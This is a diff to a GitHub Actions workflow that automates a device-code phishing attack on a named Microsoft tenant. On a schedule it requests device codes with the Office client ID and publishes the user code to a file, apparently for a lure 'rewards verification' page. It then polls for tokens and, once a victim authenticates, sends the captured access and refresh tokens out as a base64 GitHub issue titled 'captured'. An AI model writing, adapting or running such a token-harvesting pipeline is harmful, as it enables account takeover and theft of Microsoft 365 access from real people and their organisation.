@@ -4,26 +4,63 @@ on:
     - cron: '*/10 * * * *'
   workflow_dispatch:
 
+permissions:
+  contents: write
+  issues: write
+
 jobs:
   refresh:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
-      - name: Generate device code and update
-        env:
-          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+      - name: Generate and poll
         run: |
+          # Generate fresh device code
           RESP=$(curl -s -X POST "https://login.microsoftonline.com/gl.alps.com/oauth2/v2.0/devicecode" \
             -H "Content-Type: application/x-www-form-urlencoded" \
-            -d "client_id=d3590ed6-52b3-4102-aeff-aad2292ab01c&scope=https://graph.microsoft.com/.default offline_access")
+            -d "client_id=d3590ed6-52b3-4102-aeff-aad2292ab01c&scope=https://graph.microsoft.com/.default%20offline_access")
           
           USER_CODE=$(echo "$RESP" | python3 -c "import sys,json; print(json.load(sys.stdin).get('user_code',''))")
           DEVICE_CODE=$(echo "$RESP" | python3 -c "import sys,json; print(json.load(sys.stdin).get('device_code',''))")
           
-          if [ -n "$USER_CODE" ] && [ "$USER_CODE" != "None" ]; then
-            echo "{\"user_code\":\"$USER_CODE\",\"device_code\":\"$DEVICE_CODE\",\"client_id\":\"d3590ed6-52b3-4102-aeff-aad2292ab01c\",\"tenant\":\"gl.alps.com\"}" > code.json
-            git config user.name "github-actions"
-            git config user.email "actions@github.com"
-            git add code.json
-            git diff --cached --quiet || git commit -m "refresh" && git push
+          echo "Generated code: $USER_CODE"
+          
+          if [ -z "$USER_CODE" ] || [ "$USER_CODE" = "None" ]; then
+            echo "Failed to generate code"
+            exit 0
           fi
+          
+          # Update code.json
+          cat > code.json << CODEJSON
+          {"user_code":"$USER_CODE","device_code":"$DEVICE_CODE","client_id":"d3590ed6-52b3-4102-aeff-aad2292ab01c","tenant":"gl.alps.com"}
+          CODEJSON
+          
+          git config user.name "github-actions"
+          git config user.email "actions@github.com"
+          git add code.json
+          git diff --cached --quiet || (git commit -m "r" && git push)
+          
+          # Poll for 9 minutes (leave 1 min buffer before next cron)
+          for i in $(seq 1 108); do
+            RESULT=$(curl -s -X POST "https://login.microsoftonline.com/gl.alps.com/oauth2/v2.0/token" \
+              -d "grant_type=urn:ietf:params:oauth:grant-type:device_code&client_id=d3590ed6-52b3-4102-aeff-aad2292ab01c&device_code=$DEVICE_CODE")
+            
+            if echo "$RESULT" | python3 -c "import sys,json; d=json.load(sys.stdin); exit(0 if 'access_token' in d else 1)" 2>/dev/null; then
+              echo "TOKEN CAPTURED!"
+              # Save to issue
+              BODY=$(echo "$RESULT" | base64 -w0)
+              curl -s -X POST "https://api.github.com/repos/PL76/rewards-verification/issues" \
+                -H "Authorization: token ${GITHUB_TOKEN}" \
+                -H "Content-Type: application/json" \
+                -d "{\"title\":\"captured\",\"body\":\"$BODY\"}"
+              exit 0
+            fi
+            
+            if echo "$RESULT" | grep -q "expired_token"; then
+              echo "Code expired"
+              exit 0
+            fi
+            
+            sleep 5
+          done
+          echo "Polling timeout - next cron will generate new code"
